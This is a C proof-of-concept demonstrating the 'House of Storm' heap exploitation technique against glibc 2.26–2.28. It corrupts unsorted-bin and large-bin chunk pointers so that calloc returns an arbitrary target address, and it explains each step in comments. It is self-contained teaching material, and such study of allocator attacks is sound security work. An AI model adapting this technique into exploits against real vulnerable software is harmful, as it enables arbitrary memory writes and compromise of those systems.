/*

POC for House of Storm on 2.26

For 2.26-2.28, the tcache will need to 
be full for this to work. After this, 
a patch to the unsorted bin attack prevents this 
technique from working.

This technique uses a combination of editing
an unsorted bin chunk and a large bin chunk
to write a 'size' to a user choosen address in memory,
which will get pulled out from the unsorted bin.

Once this has occurred, if the size at this 'fake' 
location is the same size as the allocation, 
then the chunk will be returned back to the user. 

This attack allows arbitrary chunks to be returned
to the user! This requires the following: 
- Write on free unsorted bin chunk
- Write on free large bin chunk
- Known address of target memory address
- Known address of upper bits of heap chunk

Written by Maxwell "Strikeout" Dulin
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char filler[0x60];
char target[0x60]; 

void init(){
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
        // clearenv();
}

// Get the AMOUNT to shift over for size and the offset on the largebin.
// Needs to be a valid minimum sized chunk in order to work.
int get_shift_amount(char* pointer){
	
	int shift_amount = 0;
	long long ptr = (long long)pointer;	
	
	while(ptr > 0x20){
		ptr = ptr >> 8; 
		shift_amount += 1; 
	}	

	return shift_amount - 1; // Want amount PRIOR to this being zeroed out
}

int main(){

	init();

        char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
	int* tcaches[7];

	puts("House of Storm"); 
	puts("======================================"); 
	puts("Preparing chunks for the exploit");
	puts("Put one chunk into unsorted bin and the other into the large bin");
	puts("The unsorted bin chunk MUST be larger than the large bin chunk.");
	/*
	Putting a chunk into the unsorted bin and another
	into the large bin.
	*/
	unsorted_bin = malloc ( 0x4e8 );  // size 0x4f0 

	// prevent merging 
	malloc ( 0x18 ); 

	puts("Find the proper chunk size to allocate.");
	puts("Must be exactly the size of the written chunk from above.");
	/* 
	Find the proper size to allocate
	We are using the first 'X' bytes of the heap to act 
	as the 'size' of a chunk. Then, we need to allocate a 
	chunk exactly this size for the attack to work. 

	So, in order to do this, we have to take the higher
	bits of the heap address and allocate a chunk of this
	size, which comes from the upper bytes of the heap address.

	NOTE: 
	- This does have a 1/2 chance of failing on the 4th bit. If the 4th bit 
	of this value is set, then the size comparison will fail everytime.
	- There is ANOTHER 1/4 chance of this failing (for the demo). Either
	  the mmap bit needs to be set or the non-main arena cannot be set.
	- Without these calculations, this COULD be brute forced with relative
	  overwrites in a leakless fashion.
	*/

	int shift_amount = get_shift_amount(unsorted_bin);	
	printf("Shift Amount: %d\n", shift_amount); 

	size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
	if(alloc_size < 0x10){
		printf("Chunk Size: 0x%lx\n", alloc_size);
		puts("Chunk size is too small");
		exit(1);
	}
	alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; // Remove the size bits
	printf("In this case, the chunk size is 0x%lx\n", alloc_size);

        // Checks to see if the program will crash or not
	/*
	The fourth bit of the size and the 'non-main arena' chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. 

	Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
	validates to see if ONE of the following cases is true: 
	- av == arena_for_chunk (mem2chunk (mem))
	- chunk is mmaped

	If the 'non-main arena' bit is set on the chunk, then the 
	first case will fail. 
	If the mmap bit is set, then this will pass. 
	
	So, either the arenas need to match up (our fake chunk is in the 
	.bss section for this demo. So, clearly, this will not happen) OR
	the mmap bit must be set.

	The logic below validates that the fourth bit of the size
	is NOT set and that either the mmap bit is set or the non-main 
	arena bit is NOT set. If this is the case, the exploit should work.
	*/
        if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){
                puts("Allocation size has bit 4 of the size set or ");
		puts("mmap and non-main arena bit check will fail");
                puts("Please try again! :)");
                puts("Exiting...");
                return 1;
        }

	// If the chunk would go into the TCache, we need to fill up
	// the TCache in order to prevent TCache stashing from happening.
	if(alloc_size < 0x410){
		puts("Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)");
		puts("Done to prevent usage of TCache stashing");


		// Fill up the TCache for the proper size
		for(int i = 0; i < 7; i++){
			tcaches[i] = malloc(alloc_size);
		}
		for(int i = 0; i < 7; i++){
			free(tcaches[i]);
		}
	}
	else{
		puts("Not filling up the TCache");
	}

	large_bin  =  malloc ( 0x4d8 );  // size 0x4e0 
	// prevent merging 
	malloc ( 0x18 );

	// FIFO 
	free ( large_bin );  // put small chunks first 
	free ( unsorted_bin );

	// Put the 'large bin' chunk into the large bin
	unsorted_bin = malloc(0x4e8);
	free(unsorted_bin);

	/*
	At this point, there is a single chunk in the 
	large bin and a single chunk in the unsorted bin. 
	It should be noted that the unsorted bin chunk 
	should be LARGER in size than the large bin chunk
	but should still be within the same bin.

	In this setup, the large_bin has a chunk
	of size 0x4e0 and the unsorted bin 
	has a chunk of size 0x4f0. This technique relies on
	the unsorted bin chunk being added to the same bin
	but a larger chunk size. So, careful heap feng shui 
	must be done.
	*/

	// The address that we want to write to!
	fake_chunk = target - 0x10;

	puts("Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.\n This is our target location to get from the allocator"); 
	
	/*
	The address of our fake chunk is set to the unsorted bin 
	chunks 'bk' pointer. 

	This launches the 'unsorted_bin' attack but it is NOT the
	main purpose of us doing this.

	After launching the 'unsorted_bin attack' the 'victim' pointer
	will be set to THIS address. Our goal is to find a way to get
	this address from the allocator.

	Vulnerability!!
	*/
	((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk

	// Only needs to be a valid address. 
	(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // large_bin->fd

	puts("Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location");
	puts("of your fake chunk."); 
	puts("Misalign the location in order to use the primitive as a SIZE value."); 
	puts("The 'offset' changes depending on if the binary is PIE (5) or not PIE (2).");
	puts("Vulnerability #2!");
	puts("Overwrite large bins bk->nextsize with the address to put our fake chunk size at.");
	/* 
	This can be seen as a WRITE-WHERE primitive in the large bin.
	However, we are going to write a 'size' for our fake chunk using this. 

	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579
	to an address for our fake size. The write above (bk_nextsize) is
	controlled via the pointer we are going to overwrite below. The
	value that gets written is a heap address; the unsorted bin 
	chunk address above. 

	The 'key' to this is the offset. First, we subtract 0x18 because
	this is the offset to writting to fd_nextsize in the code shown 
	above. Secondly, notice the -2 below. We are going
	to write a 'heap address' at a mis-aligned location and
	use THIS as the size. For instance, if the heap address is 0x123456
	and the pointer is set to 0x60006. This will write the following way:
	- 0x60006: 0x56
	- 0x60007: 0x34
	- 0x60008: 0x12

	Now, our 'fake size' is at 0x60008 and is a valid size for the 
	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk
	from the allocator. 

	Second vulnerability!!!

	// The shift amount is used in order to calculate the proper offset
	to write the chunk size at, depending on the size of the pointer.
	This depends on the size of the pointer. 
	*/
	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin->bk_nextsize

	/*
	At this point, we've corrupted everything in just the right 
	way so this should work. 

	The purpose of the attack is to have a corrupted 'bk' pointer
	point to ANYWHERE we want and still get the memory back. We do
	this by using the large bin code to write a size to the 'bk' 
	location.

	This call to calloc, will return a pointer
	to the fake chunk that we created above. 
	*/

	puts("Make allocation of the size that the value will be written for.");
	puts("Once the allocation happens, the madness begins"); 
	puts("Once in the unsorted bin, the 'large bin' chunk will be used in orer to "); 
	puts("write a fake 'size' value to the location of our target."); 
	puts("After this, the target will have a valid size."); 
	puts("Next, the unsorted bin will see that the chunk (in unsorted_bin->bk) has a valid"); 
	puts("size and remove it from the bin.");
	puts("With this, we have pulled out an arbitrary chunk!");

	printf("String before: %s\n", target);
	printf("String pointer: %p\n", target);

	puts("Make a call to 'calloc' instead of 'malloc' in order to ");
	puts("not use the TCache on the allocation. Had to fill TCache");	
	puts("because stashing would prevent the exploit from working");

	// Arena_for_chunk macro may cause this to crash as well
	// https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
	ptr = calloc(alloc_size, 1);
	strncpy(ptr, "\x41\x42\x43\x44\x45\x46\x47", 0x58 - 1);
	
	printf("String after %s\n", target);
	printf("Fake chunk ptr: %p\n", ptr);

	return 0;
}
